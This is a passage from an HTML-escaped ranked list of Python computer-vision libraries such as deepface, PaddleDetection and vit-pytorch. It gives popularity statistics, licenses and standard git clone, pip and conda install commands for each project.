&lt;pre&gt;&lt;code&gt; pip install gluoncv&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/emcconville/wand&#34;&gt;Wand&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 1.2K) - The ctypes-based simple ImageMagick binding for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/emcconville/wand&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 98 · 🔀 200 · 📥 7.6K · 📦 11K · 📋 370 - 4% open · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/emcconville/wand&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/wand&#34;&gt;PyPi&lt;/a&gt; (📥 380K / month · 📦 690 · ⏱️ 17.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install wand&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/wand&#34;&gt;Conda&lt;/a&gt; (📥 11K · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge wand&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PaddleDetection&#34;&gt;PaddleDetection&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 7.8K) - Object Detection toolkit based on PaddlePaddle. It.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1M&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PaddleDetection&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 97 · 🔀 2K · 📦 18 · 📋 3.5K - 21% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PaddlePaddle/PaddleDetection&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/paddledet&#34;&gt;PyPi&lt;/a&gt; (📥 260 / month · ⏱️ 24.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install paddledet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PaddleSeg&#34;&gt;PaddleSeg&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 4.8K) - Easy-to-use image segmentation library with awesome pre-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1M&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PaddleSeg&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 78 · 🔀 1.1K · 📦 560 · 📋 1.1K - 50% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PaddlePaddle/PaddleSeg&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/paddleseg&#34;&gt;PyPi&lt;/a&gt; (📥 1.3K / month · 📦 2 · ⏱️ 20.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install paddleseg&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PyImageSearch/imutils&#34;&gt;imutils&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 4.1K) - A series of convenience functions to make basic image processing.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PyImageSearch/imutils&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 960 · 📦 25K · 📋 220 - 65% open · ⏱️ 27.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PyImageSearch/imutils&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/imutils&#34;&gt;PyPi&lt;/a&gt; (📥 290K / month · 📦 760 · ⏱️ 15.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install imutils&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/imutils&#34;&gt;Conda&lt;/a&gt; (📥 85K · ⏱️ 09.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge imutils&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/serengil/deepface&#34;&gt;deepface&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 3.9K) - A Lightweight Face Recognition and Facial Attribute Analysis (Age,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/serengil/deepface&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 870 · 📦 570 · 📋 460 - 1% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/serengil/deepface&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deepface&#34;&gt;PyPi&lt;/a&gt; (📥 33K / month · 📦 3 · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deepface&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/OlafenwaMoses/ImageAI&#34;&gt;imageai&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 7K · 💤) - A python library built to empower developers to build applications and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/OlafenwaMoses/ImageAI&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 1.9K · 📥 750K · 📦 1.1K · 📋 680 - 37% open · ⏱️ 08.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/OlafenwaMoses/ImageAI&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/imageai&#34;&gt;PyPi&lt;/a&gt; (📥 12K / month · 📦 16 · ⏱️ 05.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install imageai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/imageai&#34;&gt;Conda&lt;/a&gt; (📥 2.7K · ⏱️ 30.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge imageai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/JohannesBuchner/imagehash&#34;&gt;ImageHash&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 2.4K · 💤) - A Python Perceptual Image Hashing Module. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/JohannesBuchner/imagehash&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 300 · 📦 5.1K · 📋 110 - 12% open · ⏱️ 07.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/JohannesBuchner/imagehash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ImageHash&#34;&gt;PyPi&lt;/a&gt; (📥 1.4M / month · 📦 320 · ⏱️ 15.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ImageHash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/imagehash&#34;&gt;Conda&lt;/a&gt; (📥 180K · ⏱️ 15.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge imagehash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lucidrains/vit-pytorch&#34;&gt;vit-pytorch&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 10K) - Implementation of Vision Transformer, a simple way to achieve.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lucidrains/vit-pytorch&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 1.6K · 📦 110 · 📋 180 - 47% open · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lucidrains/vit-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/vit-pytorch&#34;&gt;PyPi&lt;/a&gt; (📥 22K / month · 📦 3 · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install vit-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mdbloice/Augmentor&#34;&gt;Augmentor&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 4.7K) - Image augmentation library in Python for machine learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mdbloice/Augmentor&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 22 · 🔀 850 · 📦 460 · 📋 200 - 63% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mdbloice/Augmentor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/Augmentor&#34;&gt;PyPi&lt;/a&gt; (📥 16K / month · 📦 29 · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install Augmentor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/1adrianb/face-alignment&#34;&gt;Face Alignment&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 5.7K · 💤) - 2D and 3D Face alignment library build using pytorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/1adrianb/face-alignment&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 23 · 🔀 1.2K · 📋 270 - 19% open · ⏱️ 04.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/1adrianb/face-alignment&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/face-alignment&#34;&gt;PyPi&lt;/a&gt; (📥 10K / month · 📦 8 · ⏱️ 14.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install face-alignment&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/abhiTronix/vidgear&#34;&gt;vidgear&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 2.2K) - A High-performance cross-platform Video Processing Python framework.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/abhiTronix/vidgear&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 9 · 🔀 180 · 📥 590 · 📦 200 · 📋 220 - 0% open · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/abhiTronix/vidgear&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/vidgear&#34;&gt;PyPi&lt;/a&gt; (📥 4.4K / month · 📦 5 · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install vidgear&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/obss/sahi&#34;&gt;sahi&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 1.6K) - A lightweight vision library for performing large scale object detection/.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/obss/sahi&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 240 · 📥 270 · 📦 61 · 📋 150 - 13% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/obss/sahi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sahi&#34;&gt;PyPi&lt;/a&gt; (📥 21K / month · 📦 5 · ⏱️ 08.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sahi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sahi&#34;&gt;Conda&lt;/a&gt; (📥 2.9K · ⏱️ 08.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sahi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Layout-Parser/layout-parser&#34;&gt;layout-parser&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 3K) - A Unified Toolkit for Deep Learning Based Document Image.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Layout-Parser/layout-parser&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 8 · 🔀 290 · 📦 70 · 📋 93 - 48% open · ⏱️ 05.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Layout-Parser/layout-parser&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/layoutparser&#34;&gt;PyPi&lt;/a&gt; (📥 5.1K / month · 📦 2 · ⏱️ 06.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install layoutparser&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ipazc/mtcnn&#34;&gt;mtcnn&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.8K · 💤) - MTCNN face detection implementation for TensorFlow, as a PIP.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ipazc/mtcnn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 450 · 📦 2.2K · 📋 100 - 62% open · ⏱️ 09.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ipazc/mtcnn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mtcnn&#34;&gt;PyPi&lt;/a&gt; (📥 30K / month · 📦 43 · ⏱️ 09.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mtcnn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/mtcnn&#34;&gt;Conda&lt;/a&gt; (📥 4.8K · ⏱️ 17.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge mtcnn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lightly-ai/lightly&#34;&gt;lightly&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.6K) - A python library for self-supervised learning on images. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lightly-ai/lightly&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 120 · 📦 36 · 📋 320 - 19% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lightly-ai/lightly&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lightly&#34;&gt;PyPi&lt;/a&gt; (📥 3.1K / month · 📦 1 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lightly&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/luispedro/mahotas&#34;&gt;mahotas&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 750) - Computer Vision in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/luispedro/mahotas&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 32 · 🔀 140 · 📦 820 · 📋 78 - 21% open · ⏱️ 07.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/luispedro/mahotas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mahotas&#34;&gt;PyPi&lt;/a&gt; (📥 9.9K / month · 📦 110 · ⏱️ 14.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mahotas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/mahotas&#34;&gt;Conda&lt;/a&gt; (📥 320K · ⏱️ 17.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge mahotas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/libvips/pyvips&#34;&gt;pyvips&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 400) - python binding for libvips using cffi. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/libvips/pyvips&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 39 · 📦 320 · 📋 280 - 37% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/libvips/pyvips&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyvips&#34;&gt;PyPi&lt;/a&gt; (📥 19K / month · 📦 39 · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyvips&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyvips&#34;&gt;Conda&lt;/a&gt; (📥 19K · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyvips&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/mmf&#34;&gt;MMF&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 4.9K) - A modular framework for vision &amp;amp; language multimodal research from.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/mmf&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 820 · 📦 12 · 📋 620 - 30% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/mmf&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mmf&#34;&gt;PyPi&lt;/a&gt; (📥 460 / month · 📦 1 · ⏱️ 12.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mmf&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/timesler/facenet-pytorch&#34;&gt;facenet-pytorch&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 2.9K) - Pretrained Pytorch face detection (MTCNN) and facial.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/timesler/facenet-pytorch&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 640 · 📥 300K · 📦 770 · 📋 150 - 40% open · ⏱️ 13.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/timesler/facenet-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/facenet-pytorch&#34;&gt;PyPi&lt;/a&gt; (📥 14K / month · 📦 11 · ⏱️ 10.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install facenet-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/pytorchvideo&#34;&gt;pytorchvideo&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 2.4K) - A deep learning library for video understanding research. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/pytorchvideo&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 260 · 📋 130 - 41% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone 